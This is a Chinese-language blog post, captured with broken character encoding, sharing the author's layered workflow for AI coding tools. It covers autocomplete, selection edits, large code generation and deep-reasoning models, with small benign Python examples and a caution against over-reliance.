            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½˜é”¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T04:59:38.000Z" title="Tue Dec 30 2025 04:59:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœæŠŠ 2022 å¹´ 6 æœˆå¾®è½¯å’Œ OpenAI æ­£å¼æ¨å‡º Copilot ä½œä¸ºèµ·ç‚¹ï¼ŒAI ç¼–ç¨‹å·²ç» 3 å¹´å¤šäº†ã€‚</p>
<p>éšç€å¤§æ¨¡å‹çš„ä¸æ–­è¿­ä»£å‡çº§ï¼Œä» Copilot åˆ° IDE ä¸‹çš„ Cursor å…¥å±€ï¼Œå†åˆ° CLI æ¨¡å¼ä¸‹çš„ Claude Codeï¼Œå…¶å¯ç”¨æ€§ï¼Œå‡†ç¡®åº¦è¶Šæ¥è¶Šå¥½ã€‚</p>
<p>åœ¨æç¤ºè¯å®Œæ•´æœ‰æ•ˆçš„å‰æä¸‹ï¼Œå¾ˆå¤šåŠŸèƒ½ï¼Œä¸ç®¡æ˜¯å‰ç«¯ï¼Œåç«¯ï¼Œç®—æ³•ï¼Œç”šè‡³æ˜¯åµŒå…¥å¼éƒ½èƒ½ã€Œä¸€æŠŠæ¢­ã€ã€‚</p>
<p>åœ¨è®¤çŸ¥èŒƒå›´å†…ï¼ŒAI ç¼–ç¨‹æˆäº†ä¸€ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·ã€‚</p>
<p>æˆ‘è‡ªå·±ä¹Ÿåœ¨æŒç»­æ·±å…¥ä½¿ç”¨ï¼Œä»¥ä¸‹ä¸ºä½¿ç”¨è¿‡ç¨‹ä¸­ä¸æ–­è¿­ä»£å‡ºæ¥ä¸€äº›ç­–ç•¥ã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆæ˜¯å¤šå±‚æ¬¡è¾…åŠ©</h2>
<p>ç”¨è¿‡å¾ˆå¤šç§å·¥å…·ï¼Œæ¯ä¸€ç§æ–°çš„å·¥å…·å‡ºæ¥ï¼Œéƒ½ä¼šè¯•ä¸€ä¸‹ï¼Œä¹ŸèŠ±äº†ä¸å°‘é’±ï¼Œä½†æ²¡æœ‰ä¸€ç§èƒ½è§£å†³æ‰€æœ‰çš„é—®é¢˜ã€‚</p>
<p>è¿™å°±åƒå®¶é‡Œçš„å·¥å…·ç®±ï¼Œèºä¸åˆ€ã€é”¤å­ã€æ‰³æ‰‹å„æœ‰å„çš„ç”¨å¤„ã€‚ç¡¬è¦ç”¨é’³å­æ‹§èºä¸ï¼Œå½“ç„¶ä¹Ÿèƒ½æ‹§ï¼Œä½†æ•ˆç‡è‚¯å®šä¸å¦‚èºä¸åˆ€ã€‚AI ç¼–ç¨‹å·¥å…·ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¸åŒçš„åœºæ™¯éœ€è¦ä¸åŒçš„å·¥å…·ï¼Œä¸åŒçš„ä»»åŠ¡éœ€è¦ä¸åŒçš„ç­–ç•¥ã€‚</p>
<p>è¿™äº›å·¥å…·ä¹‹é—´å¹¶ä¸æ˜¯äº’ç›¸æ›¿ä»£çš„å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥çš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å†™ä»£ç çš„æ—¶å€™ç”¨ Cursor çš„è‡ªåŠ¨è¡¥å…¨ï¼Œé‡åˆ°éœ€è¦é‡æ„çš„åœ°æ–¹åˆ‡æ¢åˆ°é€‰ä¸­ä¿®æ”¹æ¨¡å¼ï¼Œç¢°åˆ°å¤§å—åŠŸèƒ½ç”¨ Claude Code ç”Ÿæˆï¼ŒçœŸæ­£æ£˜æ‰‹çš„é—®é¢˜å†æ‰¾ GPT5 å¸®å¿™ã€‚è¿™ç§åˆ†å±‚çš„ä½¿ç”¨æ–¹å¼ï¼Œæ‰æ˜¯å½“å‰ AI ç¼–ç¨‹çš„è¾ƒä¼˜è§£ã€‚</p>
<h2 data-id="heading-1">å¿«é€Ÿçš„è‡ªåŠ¨è¡¥å…¨</h2>
<p>ç”¨å¾—æ¯”è¾ƒçˆ½çš„è¿˜æ˜¯è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ã€‚</p>
<p>ä¸ºå•¥ï¼Ÿ</p>
<p>å› ä¸ºå¯ä»¥æ— è„‘ Tabï¼Œå°èŒƒå›´çš„æ”¹åŠ¨ï¼Œçœ‹ä¸€çœ¼æ˜¯å¦ç¬¦åˆé¢„æœŸå°±å¯ä»¥äº†ï¼Œé€Ÿåº¦å¿«ã€‚</p>
<p>ç”¨çœ‹èµ·æ¥æ¯”è¾ƒé«˜å¤§ä¸Šçš„è¯æ¥è¯´å°±æ˜¯<strong>ä»»åŠ¡è¯´æ˜çš„æ¯”ç‰¹é‡</strong>ã€‚</p>
<p>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå‡è®¾æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªç”¨æˆ·ç™»å½•çš„éªŒè¯é€»è¾‘ã€‚å¦‚æœç”¨è‡ªç„¶è¯­è¨€æè¿°ï¼Œå¯èƒ½éœ€è¦å†™ï¼š"è¯·å¸®æˆ‘å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç ï¼Œå…ˆæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œç„¶åéªŒè¯å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœéƒ½é€šè¿‡å°±ç”Ÿæˆ token è¿”å›ï¼Œå¦åˆ™æŠ›å‡ºç›¸åº”çš„é”™è¯¯..."</p>
<p>ä½†å¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨ä»£ç é‡Œå†™ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_login</span>(<span class="hljs-params">username, password</span>):
    <span class="hljs-comment"># æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨</span>
    user = User.query.filter_by(username=username).first()
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:
</code></pre>
<p>å†™åˆ°è¿™é‡Œï¼ŒCursor åŸºæœ¬å°±èƒ½ç†è§£ä½ è¦å¹²ä»€ä¹ˆäº†ï¼ŒTab ä¸€æŒ‰ï¼Œåé¢çš„ä»£ç å°±å‡ºæ¥äº†ã€‚è¿™ç§æ–¹å¼çš„ä¿¡æ¯å¯†åº¦æé«˜ï¼Œè€Œä¸”æ˜¯åœ¨æ­£ç¡®çš„ä¸Šä¸‹æ–‡ä½ç½®ï¼ŒAI ç†è§£èµ·æ¥æ›´å‡†ç¡®ã€‚</p>
<p>ä¸è¿‡ï¼Œè‡ªåŠ¨è¡¥å…¨ä¹Ÿæœ‰å‘çš„æ—¶å€™ã€‚æœ‰æ—¶å€™æˆ‘ä»¬åªæ˜¯æƒ³æ¢ä¸ªè¡Œï¼Œå®ƒéè¦è¡¥å…¨ä¸€å¤§æ®µï¼›æœ‰æ—¶å€™æˆ‘ä»¬åœ¨æ€è€ƒï¼Œå®ƒä¸åœåœ°å¼¹å»ºè®®æ‰“æ–­æ€è·¯ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨éœ€è¦ä¸“æ³¨æ€è€ƒçš„æ—¶å€™å°±æŠŠå®ƒå…³äº†ï¼Œéœ€è¦å¿«é€Ÿå®ç°çš„æ—¶å€™å†æ‰“å¼€ã€‚</p>
<p>è¿˜æœ‰ä¸ªå°æŠ€å·§æ˜¯å†™æ³¨é‡Šå¼•å¯¼ã€‚æ¯”å¦‚æˆ‘ä»¬è¦å¤„ç†ä¸€ä¸ªå¤æ‚çš„æ•°æ®è½¬æ¢ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å°†åµŒå¥—çš„å­—å…¸ç»“æ„å±•å¹³æˆåˆ—è¡¨</span>
<span class="hljs-comment"># ä¾‹å¦‚: {'a': {'b': 1, 'c': 2}} -&gt; [('a.b', 1), ('a.c', 2)]</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">flatten_dict</span>(<span class="hljs-params">d, parent_key=<span class="hljs-string">''</span></span>):
</code></pre>
<p>è¿™ç§æ³¨é‡Šä¸æ˜¯ä¸ºäº†ç»™äººçœ‹çš„ï¼Œä¸»è¦æ˜¯ç»™ AI çœ‹çš„ã€‚æœ‰äº†è¿™ä¸ªä¾‹å­ï¼ŒAI ç”Ÿæˆçš„ä»£ç å‡†ç¡®ç‡èƒ½æå‡ä¸€å¤§æˆªã€‚</p>
<h2 data-id="heading-2">ç²¾å‡†çš„é€‰ä¸­ä¿®æ”¹</h2>
<p>å½“ä»£ç å·²ç»å†™å¥½ï¼Œä½†éœ€è¦è°ƒæ•´çš„æ—¶å€™ï¼Œé€‰ä¸­ä¿®æ”¹å°±æ´¾ä¸Šç”¨åœºäº†ã€‚è¿™ä¸ªåŠŸèƒ½çœ‹èµ·æ¥ç®€å•ï¼Œç”¨å¥½äº†å´èƒ½å¤§å¹…æå‡æ•ˆç‡ã€‚</p>
<p>æ¯”å¦‚æœ‰ä¸€æ®µç”¨ for å¾ªç¯å†™çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python">result = []
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:
    <span class="hljs-keyword">if</span> item.status == <span class="hljs-string">'active'</span>:
        result.append(item.name)
</code></pre>
<p>é€‰ä¸­è¿™æ®µä»£ç ï¼Œå‘Šè¯‰ AIï¼š"æ”¹æˆåˆ—è¡¨æ¨å¯¼å¼"ï¼Œç«‹é©¬å°±å˜æˆäº†ï¼š</p>
<pre><code class="hljs language-python" lang="python">result = [item.name <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items <span class="hljs-keyword">if</span> item.status == <span class="hljs-string">'active'</span>]
</code></pre>
<p>æˆ–è€…æœ‰ä¸€ä¸ªå‡½æ•°å¤„ç†äº†å¤ªå¤šé€»è¾‘ï¼Œé€‰ä¸­åè¯´ï¼š"æ‹†åˆ†æˆå¤šä¸ªå°å‡½æ•°"ï¼ŒAI å°±ä¼šå¸®æˆ‘ä»¬é‡æ„ã€‚è¿™ç§åœºæ™¯ä¸‹ï¼ŒAI çš„ç†è§£éå¸¸ç²¾å‡†ï¼Œå› ä¸º<strong>ä¸Šä¸‹æ–‡æ˜ç¡®ï¼Œä»»åŠ¡å•ä¸€</strong>ã€‚</p>
<p>æˆ‘ç»å¸¸ç”¨é€‰ä¸­ä¿®æ”¹æ¥åšè¿™äº›äº‹ï¼š</p>
<ul>
<li>æ·»åŠ é”™è¯¯å¤„ç†</li>
<li>ä¼˜åŒ–æ€§èƒ½ç“¶é¢ˆ</li>
<li>è°ƒæ•´ä»£ç é£æ ¼</li>
<li>æ·»åŠ ç±»å‹æ³¨è§£</li>
<li>ç”Ÿæˆå•å…ƒæµ‹è¯•</li>
</ul>
<p>æœ‰ä¸ªå°ç‚¹å°±æ˜¯ï¼Œé€‰ä¸­ä¿®æ”¹çš„æŒ‡ä»¤è¦å°½é‡å…·ä½“ã€‚æ¯”å¦‚ã€Œä¼˜åŒ–è¿™æ®µä»£ç ã€å°±å¤ªæ¨¡ç³Šäº†ï¼ŒAI å¯èƒ½ä¼šè¿‡åº¦ä¼˜åŒ–ï¼ŒæŠŠç®€å•çš„ä»£ç æå¾—å¾ˆå¤æ‚ã€‚ä½†å¦‚æœè¯´ã€ŒæŠŠè¿™ä¸ªåµŒå¥—å¾ªç¯æ”¹æˆä½¿ç”¨ itertoolsã€ï¼Œç»“æœå°±ä¼šç²¾å‡†å¾ˆå¤šã€‚</p>
<h2 data-id="heading-3">å¤§å—çš„ä»£ç ç”Ÿæˆ</h2>
<p>å½“éœ€è¦å®ç°ä¸€ä¸ªå®Œæ•´çš„åŠŸèƒ½æ¨¡å—æ—¶ï¼ŒClaude Codeã€Warp.dev è¿™ç±»å·¥å…·å°±è¯¥ä¸Šåœºäº†ã€‚è¿™ä¸€å±‚çš„ä½¿ç”¨é¢‘ç‡ä¸å¦‚å‰ä¸¤å±‚é«˜ï¼Œä½†åœ¨ç‰¹å®šåœºæ™¯ä¸‹ä¸å¯æˆ–ç¼ºã€‚</p>
<p>ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿé€šå¸¸æ˜¯è¿™äº›æƒ…å†µï¼š</p>
<p><strong>1. å®ç°æ ‡å‡†åŒ–çš„åŠŸèƒ½æ¨¡å—</strong></p>
<p>æ¯”å¦‚å®ç°ä¸€ä¸ªå®Œæ•´çš„ CRUD APIã€é›†æˆç¬¬ä¸‰æ–¹æœåŠ¡ã€å®ç°å¸¸è§çš„ç®—æ³•ç­‰ã€‚è¿™äº›åŠŸèƒ½æœ‰æ˜ç¡®çš„æ¨¡å¼å¯å¾ªï¼ŒAI ç”Ÿæˆçš„ä»£ç è´¨é‡å·²ç»å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚</p>
<p><strong>2. å¤„ç†ä¸ç†Ÿæ‚‰çš„æŠ€æœ¯æ ˆ</strong></p>
<p>æœ€è¿‘æˆ‘åœ¨å†™ Rustï¼Œè¯´å®è¯ï¼Œownership å’Œ lifetime è¿™äº›æ¦‚å¿µç†è§£å½’ç†è§£ï¼ŒçœŸå†™èµ·æ¥è¿˜æ˜¯ç£•ç£•ç»Šç»Šã€‚è¿™æ—¶å€™ Claude Code å°±ç‰¹åˆ«æœ‰ç”¨ï¼Œè™½ç„¶å®ƒä¸å¤ªæ„¿æ„è§£é‡Šä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ï¼Œä½†è‡³å°‘èƒ½ç»™å‡ºèƒ½è·‘çš„ä»£ç ï¼Œæˆ‘å¯ä»¥åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå­¦ä¹ å’Œè°ƒæ•´ã€‚</p>
<p><strong>3. ç”Ÿæˆä¸€æ¬¡æ€§çš„å·¥å…·ä»£ç </strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå¸¸ç”¨çš„é€»è¾‘ã€‚ä»¥å‰å†™ä¸ªä¸´æ—¶ç”¨çš„å°çˆ¬è™«ï¼Œæ€ä¹ˆå¾—ä¹Ÿè¦åŠå¤©ï¼Œå½“å­—æ®µå¤šçš„æ—¶å€™ï¼Œè€—æ—¶æ›´é•¿äº†ã€‚ç°åœ¨ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä¼šæŠŠåœ°å€ï¼Œéœ€è¦çˆ¬å–çš„å­—æ®µä¸€æ¬¡æ€§ç»™ AIï¼Œ AI ä¼šç”Ÿæˆå®Œæ•´çš„ä»£ç ï¼Œå½“å‡ºç°é—®é¢˜æ—¶ï¼Œå¦‚æœèƒ½å¿«é€Ÿè§£å†³æ‰ï¼Œå°±è§£å†³ä¸€ä¸‹ï¼Œå¦‚æœä¸èƒ½ï¼Œç›´æ¥å…¨éƒ¨åˆ äº†é‡æ–°ç”Ÿæˆã€‚</p>
<p>è¿™å¯ä»¥å«åšçš„ã€Œ<strong>ä»£ç åç¨€ç¼ºæ—¶ä»£</strong>ã€â€”â€”ä»£ç ä¸å†æ˜¯ç¨€ç¼ºèµ„æºï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºäº†ä¸€ä¸ªä¸´æ—¶éœ€æ±‚ç”Ÿæˆå¤§é‡ä»£ç ï¼Œç”¨å®Œå°±æ‰”ã€‚</p>
<p>å½“ç„¶ï¼Œè¿™ç§å¤§å—çš„ä»£ç ï¼Œå½“æç¤ºè¯æˆ–è€…è§„åˆ™è®¾å®šä¸é‚£ä¹ˆå¥½çš„æ—¶å€™ï¼Œè¿˜æ˜¯ä¼šä¸€äº›å‘ä¼šè¸©åˆ°ï¼Œå¦‚ï¼š</p>
<p><strong>ä»£ç å“å‘³é—®é¢˜</strong>ï¼šAI ç”Ÿæˆçš„ä»£ç å¾€å¾€å¾ˆ"å•°å—¦"ã€‚æ˜æ˜å¯ä»¥ç”¨åˆ—è¡¨æ¨å¯¼å¼ä¸€è¡Œæå®šçš„ï¼Œå®ƒåè¦å†™ä¸ªåµŒå¥—çš„ if-elseï¼›æ˜æ˜å¯ä»¥æŠ½è±¡æˆå‡½æ•°çš„ï¼Œå®ƒåè¦å¤åˆ¶ç²˜è´´ã€‚æ¯æ¬¡ç”¨å®Œéƒ½éœ€è¦äººå·¥æ¸…ç†ä¸€éã€‚</p>
<p><strong>è¿‡åº¦é˜²å¾¡æ€§ç¼–ç¨‹</strong>ï¼šAI ç‰¹åˆ«å–œæ¬¢åŠ  try-catchï¼Œæœ‰æ—¶å€™å®Œå…¨æ²¡å¿…è¦çš„åœ°æ–¹ä¹Ÿè¦åŒ…ä¸€å±‚ã€‚è¿˜å–œæ¬¢åšå„ç§å‚æ•°æ ¡éªŒï¼Œå³ä½¿åœ¨å†…éƒ¨å‡½æ•°é‡Œä¹Ÿè¦æ£€æŸ¥ä¸€éã€‚</p>
<p><strong>æŠ½è±¡å±‚æ¬¡æ··ä¹±</strong>ï¼šæœ‰æ—¶å€™è¯¥æŠ½è±¡çš„ä¸æŠ½è±¡ï¼Œä¸è¯¥æŠ½è±¡çš„è¿‡åº¦æŠ½è±¡ã€‚æ¯”å¦‚åªç”¨ä¸€æ¬¡çš„é€»è¾‘éè¦åŒ…è£…æˆç±»ï¼Œæˆ–è€…æ˜æ˜å¯ä»¥å¤ç”¨çš„ä»£ç å´åˆ°å¤„å¤åˆ¶ã€‚</p>
<h2 data-id="heading-4">éš¾é¢˜çš„æ·±åº¦æ±‚è§£</h2>
<p>é‡åˆ°çœŸæ­£æ£˜æ‰‹çš„é—®é¢˜æ—¶ï¼Œå°±å¾—è¯·å‡º GPT5 æ·±åº¦æ€è€ƒæ¨¡å¼ è¿™ç§çº§åˆ«çš„æ¨¡å‹äº†ã€‚é€Ÿåº¦å¾ˆæ…¢ï¼Œä½†æ˜¯å¾€å¾€èƒ½è§£å†³æœ€å…³é”®çš„é—®é¢˜ã€‚</p>
<p>æˆ‘å°è±¡æœ€æ·±çš„ä¸€æ¬¡æ˜¯åœ¨åªæœ‰ 8 MB çš„åµŒå…¥å¼è®¾å¤‡ä¸Šå¢åŠ ä¸€ä¸ªå°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œè™½ç„¶å®˜æ–¹æœ‰æ–‡æ¡£ï¼Œä½†æ˜¯è¯­ç„‰ä¸è¯¦ï¼Œåœ¨ç½‘ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ä»¥å‚è€ƒçš„ï¼Œå†åŠ ä¸Šè‡ªå·±å¯¹äºåµŒå…¥å¼å¼€å‘ä¸ç†Ÿï¼ŒæŠ˜è…¾è°ƒè¯•äº†ä¸¤å¤©ï¼Œä¸€ç›´ä¼šæŒ‚ï¼Œæœ€åæŠŠå…¨éƒ¨ä¸Šä¸‹æ–‡ï¼ŒåŒ…æ‹¬åœ¨ç½‘ä¸Šæ‰¾çš„èµ„æ–™éƒ½æ‰”ç»™ GPT5ï¼Œå®ƒåˆ†æäº† 2 åˆ†é’Ÿï¼Œæœ€åå‘ç°æ˜¯ä¸€ä¸ªå‚æ•°æ²¡æœ‰é…ç½®æ­£ç¡®ã€‚</p>
<h2 data-id="heading-5">æƒè¡¡ä¸é€‰æ‹©</h2>
<p>è¯´äº†è¿™ä¹ˆå¤šï¼Œå®é™…ä½¿ç”¨ä¸­æ€ä¹ˆé€‰æ‹©å‘¢ï¼Ÿæˆ‘çš„ç»éªŒæ˜¯è¿™æ ·çš„ï¼š</p>
<p><strong>çœ‹ä»»åŠ¡å¤æ‚åº¦</strong>ï¼šç®€å•çš„è¡¥å…¨ç”¨ Tabï¼Œå±€éƒ¨ä¿®æ”¹ç”¨é€‰ä¸­ï¼Œå®Œæ•´åŠŸèƒ½ç”¨ Claude Codeï¼Œå¤æ‚é—®é¢˜ç”¨ GPT5ã€‚è¿™æ˜¯åŸºæœ¬åŸåˆ™ã€‚</p>
<p><strong>çœ‹ç†Ÿæ‚‰ç¨‹åº¦</strong>ï¼šç†Ÿæ‚‰çš„ä»£ç è‡ªå·±å†™é…åˆè‡ªåŠ¨è¡¥å…¨æ›´å¿«ï¼›ä¸ç†Ÿæ‚‰çš„é¢†åŸŸå¤šä¾èµ– AI ç”Ÿæˆï¼Œä½†è¦ä»”ç»† reviewã€‚</p>
<p><strong>çœ‹ä»£ç ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šä¸´æ—¶è„šæœ¬éšä¾¿è®© AI ç”Ÿæˆï¼›æ ¸å¿ƒä¸šåŠ¡ä»£ç è¦ä¸¥æ ¼æŠŠå…³ï¼Œå®å¯è‡ªå·±å†™ä¹Ÿä¸èƒ½æœ‰éšæ‚£ã€‚</p>
<p>è¿˜æœ‰ä¸ªé‡è¦çš„ç‚¹æ˜¯<strong>ä¸è¦è¿‡åº¦ä¾èµ–</strong>ã€‚æœ‰äººå®Œå…¨ä¾èµ– AIï¼Œè‡ªå·±åŸºæœ¬ä¸å†™ä»£ç äº†ï¼Œç”šè‡³çœ‹ä¹Ÿä¸çœ‹ã€‚çŸ­æœŸçœ‹èµ·æ¥æ•ˆç‡å¾ˆé«˜ï¼Œä½†é•¿æœŸæ¥è¯´æ˜¯æœ‰é—®é¢˜çš„ï¼š</p>
<ol>
<li>å¤±å»äº†å¯¹ä»£ç çš„æŒæ§æ„Ÿï¼Œå‡ºé—®é¢˜ä¸çŸ¥é“æ€ä¹ˆæ”¹</li>
<li>ä»£ç é£æ ¼ä¸ç»Ÿä¸€ï¼Œç»´æŠ¤æˆæœ¬å¢åŠ </li>
<li>åŸºç¡€èƒ½åŠ›é€€åŒ–ï¼Œç¦»å¼€ AI å°±ä¸ä¼šå†™ä»£ç äº†</li>
</ol>
<p>AI æ˜¯è¾…åŠ©å·¥å…·ï¼Œä¸æ˜¯æ›¿ä»£å“ã€‚æ ¸å¿ƒé€»è¾‘è¿˜æ˜¯è¦è‡ªå·±æŠŠæ¡ï¼ŒAI è´Ÿè´£æé«˜æ•ˆç‡å’Œå¤„ç†ç¹ççš„éƒ¨åˆ†ã€‚</p>
<h2 data-id="heading-6">å·¥å…·é“¾ååŒ</h2>
<p>åœ¨å®è·µä¸­ï¼Œè¿™äº›å·¥å…·ä¸æ˜¯å­¤ç«‹ä½¿ç”¨çš„ï¼Œè€Œæ˜¯å½¢æˆäº†ä¸€ä¸ªå·¥ä½œæµã€‚æˆ‘çš„å…¸å‹å·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<p><strong>1. æ„æ€é˜¶æ®µ</strong>ï¼šå…ˆåœ¨ ChatGPT æˆ– Gemini ä¸Šè®¨è®ºè®¾è®¡æ€è·¯ï¼Œç¡®å®šå¤§æ–¹å‘ã€‚è¿™ä¸ªé˜¶æ®µä¸»è¦æ˜¯ç†æ¸…æ€è·¯ï¼Œè®¾è®¡æ•°æ®æ¶æ„ï¼Œä¸æ¶‰åŠå…·ä½“ä»£ç ã€‚</p>
<p><strong>2. æ¡†æ¶æ­å»º</strong>ï¼šç”¨ Claude Code/WARP ç”ŸæˆåŸºç¡€æ¡†æ¶å’Œé¡¹ç›®ç»“æ„ã€‚è¿™éƒ¨åˆ†ç›¸å¯¹æ ‡å‡†åŒ–ï¼ŒAI ç”Ÿæˆçš„è´¨é‡ä¸é”™ã€‚</p>
<p><strong>3. æ ¸å¿ƒå®ç°</strong>ï¼šåˆ‡æ¢åˆ° Cursor/Traeï¼Œè‡ªå·±å†™æ ¸å¿ƒé€»è¾‘ï¼Œé…åˆè‡ªåŠ¨è¡¥å…¨æé«˜æ•ˆç‡ã€‚è¿™éƒ¨åˆ†éœ€è¦ç²¾ç¡®æ§åˆ¶ï¼Œä¸èƒ½å®Œå…¨äº¤ç»™ AIã€‚</p>
<p><strong>4. åŠŸèƒ½å®Œå–„</strong>ï¼šéœ€è¦æ·»åŠ çš„è¾…åŠ©åŠŸèƒ½ã€å·¥å…·å‡½æ•°ç­‰ï¼Œå¯ä»¥ç”¨ Claude Code/WARP æ‰¹é‡ç”Ÿæˆã€‚</p>
